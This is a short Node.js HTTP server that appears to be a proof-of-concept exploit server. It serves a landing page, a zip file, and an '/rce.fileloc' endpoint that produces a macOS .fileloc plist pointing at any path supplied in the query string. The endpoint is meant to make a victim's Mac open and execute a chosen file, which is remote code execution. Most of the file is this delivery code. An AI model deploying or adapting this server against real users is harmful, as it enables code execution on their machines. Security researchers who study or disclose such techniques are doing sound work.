const fs = require("fs");
const http = require("http");

const APP_ZIP_BYTES = fs.readFileSync("test.zip");

const server = http.createServer((req, res) => {
    console.log(req.method, req.url);
    let url = new URL(req.url, "http://localhost:8080");
    switch (url.pathname) {
        case "/":
            res.writeHead(200, { "Content-Type": "text/html" });
            res.end(fs.readFileSync("index.html"));
            break;
        case "/example.html":
            res.writeHead(200, { "Content-Type": "text/html" });
            res.end(fs.readFileSync("example.html"));
            break;
        case "/test.zip":
            res.writeHead(200, { "Content-Type": "application/zip" });
            res.end(APP_ZIP_BYTES);
            break;
        case "/rce.fileloc":
            let path = url.searchParams.get("path");
            res.writeHead(200, { "Content-Type": "text/plain" });
            res.end(`<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>URL</key>
                <string>${decodeURIComponent(path)}</string>
                <key>URLPrefix</key>
                <integer>0</integer>
            </dict>
            </plist>
            `);
            break;
        default:
            res.writeHead(404, { "Content-Type": "text/plain" });
            res.end("404 Not Found");
            break;
    }
});

server.listen(8080, err => {
    if (err) throw err;
    console.log("Server listening on port 8080");
});